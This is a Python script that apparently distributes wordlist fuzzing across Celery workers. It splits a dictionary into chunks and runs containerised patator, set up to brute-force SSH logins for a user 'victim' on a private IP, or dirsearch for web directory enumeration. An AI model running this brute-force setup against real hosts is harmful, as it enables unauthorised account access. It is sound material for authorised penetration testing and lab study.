#!/usr/bin/python
from .tasks import fuzzer
from celery import uuid
from celery.result import AsyncResult

import os
import requests
import time

from celery.task.control import inspect

if __name__ == '__main__':

#   FUZZER = "patator"
    FUZZER = "dirsearch"

    if FUZZER == "patator":
        fuzzer_container = "registry:443/patator:latest"
        fuzzer_start = "python2 -W ignore patator.py"
        fuzzer_options = "ssh_login host=10.1.38.15 user=victim password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'"
        dict = 'dict/passwords-long-list.txt'

    if FUZZER == "dirsearch":
        fuzzer_container = "registry:443/dirsearch:latest"
        fuzzer_start = "python3 -W ignore dirsearch.py"
        fuzzer_options = "--url http://10.1.38.15 -e html --wordlist=wordlist.txt --simple-report=/dirsearch/result.txt"
        dict = 'dict/wordlist-long-list.txt'

    words = 10

    upload_dict_url = "http://backend:5000/uploader"
    remove_dict_url = "http://backend:5000/remover"

    result_id_list = []
    taskid_list = []
    output = ""

    with open(dict) as f:
        content=f.readlines()

    dictLength=len(content)
    partStartIndex=0
    partEndIndex=words
    dictExceed=False

    while True:
        taskid = uuid()
        taskid_list.append(taskid)
        with open('dict/'+str(taskid), 'w') as f:
            for i in range(partStartIndex, partEndIndex):
                f.write(content[i])
        partStartIndex=partEndIndex
        partEndIndex=partEndIndex+words
        if partEndIndex>dictLength:
            partEndIndex=dictLength
            dictExceed=True

        files = {'file': open('dict/'+str(taskid), 'rb')}
        requests.post(upload_dict_url, files=files)
        os.remove('dict/'+str(taskid))

        result = fuzzer.delay(taskid, fuzzer_container, fuzzer_start, fuzzer_options)
        result_id_list.append(result.id)

        if (dictExceed):
            break

    while not result.ready():
        time.sleep(1)

    for result_id in result_id_list:
        ares = AsyncResult(result_id,app=fuzzer)
        output = output+ares.get()

    print (output)
